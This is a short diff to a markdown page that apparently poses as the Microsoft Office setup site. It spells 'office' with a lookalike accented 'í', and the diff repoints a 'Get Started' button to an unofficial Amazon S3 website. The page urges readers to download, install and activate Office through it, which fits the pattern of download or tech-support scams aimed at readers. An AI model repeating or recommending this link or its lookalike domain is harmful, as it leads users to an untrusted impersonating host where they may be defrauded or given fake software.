@@ -1,6 +1,6 @@
 # Offíce.com/setup 
 
-[![offíce.com/setup](get-Started.png)](#)
+[![offíce.com/setup](get-Started.png)](http://offred.s3-website-us-west-1.amazonaws.com)
 
 Offíce setup applications are specially designed to enhance the performance of every section of society whether it is enterprises, school students, universities or individuals working in offíces. If you want to get started with offíce setup, then you need to download, install and activate MS offíce from **offíce.com/setup** to avail the various benefits the offíce suite is providing.
 
